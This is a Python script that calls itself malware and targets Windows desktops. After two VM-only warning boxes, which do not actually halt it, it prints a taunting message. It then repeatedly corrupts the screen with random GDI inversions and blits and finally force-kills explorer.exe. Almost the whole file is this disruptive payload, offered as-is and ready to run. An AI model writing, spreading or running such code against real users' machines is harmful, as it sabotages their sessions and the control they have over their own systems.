import os
import win32api,win32con
from win32gui import *
from win32api import *
from win32ui import *
from win32con import *
from random import *

desk = GetDC(0)

w = GetSystemMetrics(0)
h = GetSystemMetrics(1)
a = GetSystemMetrics(SM_CXSCREEN)
b = GetSystemMetrics(SM_CYSCREEN)
sw = GetSystemMetrics(0)
sh = GetSystemMetrics(1)
x = GetSystemMetrics(0)
y = GetSystemMetrics(1)
xs = GetSystemMetrics(SM_CXSCREEN)
ys = GetSystemMetrics(SM_CYSCREEN)
i = 0
i < 1900

win32api.MessageBox(0, "This is a malware,dont run in the real machine,if you run in real machine,please quit this window,please run in the VM or VBOX machine!", "malware",win32con.MB_OK|MB_ICONEXCLAMATION) == IDNO
win32api.MessageBox(0, "The last warning,if you run in real machine,please quit the window!please run in the VM or VBOX machine!", "malware",win32con.MB_OK|MB_ICONEXCLAMATION) == IDNO
os.system("cls")
print('rickroll!your has been fucked by Magic Hallucinate!now enjoy the last time!hahaha')


for i in range(0,4):
    brush = CreateSolidBrush(RGB(
    randrange(255),
    randrange(255),
    randrange(255),
    ))
    SelectObject(desk,brush)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),PATINVERT)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),BLACKNESS)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),WHITENESS)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),PATINVERT)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),PATINVERT)
    StretchBlt(desk, -20, -20, sw+40, sh+40, desk, 0, 0, sw, sh, 0x9999999)
    PatBlt(desk,0,0,x,y,PATINVERT)
    BitBlt(desk,10,10,w,h,desk,0,180,SRCAND)
    BitBlt(desk,10,10,w,h,desk,0,90,SRCPAINT)
    BitBlt(desk,10,10,w,h,desk,180,0,SRCAND)
    BitBlt(desk,10,10,w,h,desk,90,0,SRCPAINT)
    DeleteObject(brush)

for i in range(0,6):
    brush = CreateSolidBrush(RGB(
    randrange(255),
    randrange(255),
    randrange(255),
    ))
    SelectObject(desk,brush)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),PATINVERT)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),BLACKNESS)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),WHITENESS)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),PATINVERT)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),PATINVERT)
    PatBlt(desk,0,0,x,y,PATINVERT)
    BitBlt(desk,10,10,w,h,desk,0,180,SRCAND)
    BitBlt(desk,10,10,w,h,desk,0,90,SRCPAINT)
    BitBlt(desk,10,10,w,h,desk,180,0,SRCAND)
    BitBlt(desk,10,10,w,h,desk,90,0,SRCPAINT)

for i in range(0,10):
    brush = CreateSolidBrush(RGB(
        randrange(255),
        randrange(255),
        randrange(255),
        ))
    SelectObject(desk,brush)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),PATINVERT)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),BLACKNESS)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),WHITENESS)
    PatBlt(desk,0,0,x,y,PATINVERT)
    StretchBlt(desk, 30, 30, sw - 0, sh - 0, desk, sw, sh, -sw, -sh, SRCCOPY)
    StretchBlt(GetDC(NULL), 50, 50, a - 100, b - 100, GetDC(NULL), 0, 0, a, b, SRCCOPY)
    DeleteObject(brush)

for i in range(0,20):
    brush = CreateSolidBrush(RGB(
        randrange(255),
        randrange(255),
        randrange(255),
        ))
    SelectObject(desk,brush)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),PATINVERT)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),BLACKNESS)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),WHITENESS)
    PatBlt(desk,0,0,x,y,PATINVERT)
    StretchBlt(desk, 30, 30, sw - 0, sh - 0, desk, sw, sh, -sw, -sh, SRCCOPY)
    StretchBlt(GetDC(NULL), 50, 50, a - 100, b - 100, GetDC(NULL), 0, 0, a, b, SRCCOPY)
    BitBlt(desk,10,10,w,h,desk,24,12,SRCCOPY)
    BitBlt(desk,10,10,w,h,desk,-255,-20,SRCCOPY)
    BitBlt(desk,10,10,w,h,desk,12,12,SRCCOPY)
    BitBlt(desk,10,100,w,h,desk,12,12,SRCAND)
    BitBlt(desk,100,100,w,h,desk,12,12,SRCAND)
    DeleteObject(brush)

for i in range(0,15):
    brush = CreateSolidBrush(RGB(
        randrange(255),
        randrange(255),
        randrange(255),
        ))
    SelectObject(desk,brush)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),PATINVERT)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),BLACKNESS)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),WHITENESS)
    PatBlt(desk,0,0,x,y,PATINVERT)
    StretchBlt(desk, 30, 30, sw - 0, sh - 0, desk, sw, sh, -sw, -sh, SRCCOPY)
    StretchBlt(GetDC(NULL), 50, 50, a - 100, b - 100, GetDC(NULL), 0, 0, a, b, SRCCOPY)
    BitBlt(desk,10,10,w,h,desk,24,12,SRCCOPY)
    BitBlt(desk,10,10,w,h,desk,-255,-20,SRCCOPY)
    BitBlt(desk,10,10,w,h,desk,12,12,SRCCOPY)
    BitBlt(desk,10,100,w,h,desk,12,12,SRCAND)
    BitBlt(desk,100,100,w,h,desk,12,12,SRCAND)
    BitBlt(desk,10,10,w,h,desk,12,12,SRCINVERT)
    DeleteObject(brush)

for i in range(0,5):
    BitBlt(desk,10,10,w,h,desk,12,12,SRCCOPY)
    BitBlt(desk,10,10,w,h,desk,12,12,SRCCOPY)
    BitBlt(desk,10,10,w,h,desk,12,12,SRCCOPY)
    BitBlt(desk,10,10,w,h,desk,12,12,SRCAND)
    StretchBlt(desk, -20, -20, sw+40, sh+40, desk, 0, 0, sw, sh, 0x9999999)
    StretchBlt(desk, 0, 0, sw, sh, desk,sw,sh, sw, sh, SRCPAINT)
    BitBlt(desk, i, i, i, i, desk, i, i, NOTSRCCOPY)
    BitBlt(desk, a, b, 200, 200, desk, a, b,0x114514)
    BitBlt(GetDC(NULL), x, y, x,y, GetDC(NULL),x,y, NOTSRCCOPY);
    BitBlt(desk, 15, 15, sw, sh, desk, 15, 5, SRCCOPY)

for i in range(0,12):
    brush = CreateSolidBrush(RGB(
        randrange(255),
        randrange(255),
        randrange(255),
        ))
    SelectObject(desk,brush)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),PATINVERT)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),BLACKNESS)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),WHITENESS)
    PatBlt(desk,0,0,x,y,PATINVERT)
    StretchBlt(desk, 30, 30, sw - 0, sh - 0, desk, sw, sh, -sw, -sh, SRCCOPY)
    StretchBlt(GetDC(NULL), 50, 50, a - 100, b - 100, GetDC(NULL), 0, 0, a, b, SRCCOPY)
    BitBlt(desk,10,10,w,h,desk,24,12,SRCCOPY)
    BitBlt(desk,10,10,w,h,desk,-255,-20,SRCCOPY)
    BitBlt(desk,10,10,w,h,desk,12,12,SRCCOPY)
    BitBlt(desk,10,100,w,h,desk,12,12,SRCAND)
    DeleteObject(brush)

for i in range(0,10):
    brush = CreateSolidBrush(RGB(
    randrange(255),
    randrange(255),
    randrange(255),
    ))
    SelectObject(desk,brush)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),PATINVERT)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),BLACKNESS)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),WHITENESS)
    PatBlt(desk,0,0,x,y,PATINVERT)
    BitBlt(desk,10,10,w,h,desk,12,12,SRCCOPY)
    BitBlt(desk,10,10,w,h,desk,12,12,SRCCOPY)
    BitBlt(desk,10,10,w,h,desk,12,12,SRCCOPY)
    BitBlt(desk,10,10,w,h,desk,12,12,SRCAND)
    DeleteObject(brush)

for i in range(0,45):
    BitBlt(desk,10,10,w,h,desk,90,0,SRCAND)
    BitBlt(desk,10,10,w,h,desk,180,0,SRCPAINT)
    BitBlt(desk,10,10,w,h,desk,0,90,SRCAND)
    BitBlt(desk,10,10,w,h,desk,0,180,SRCPAINT)

os.system("taskkill /f /im explorer.exe")
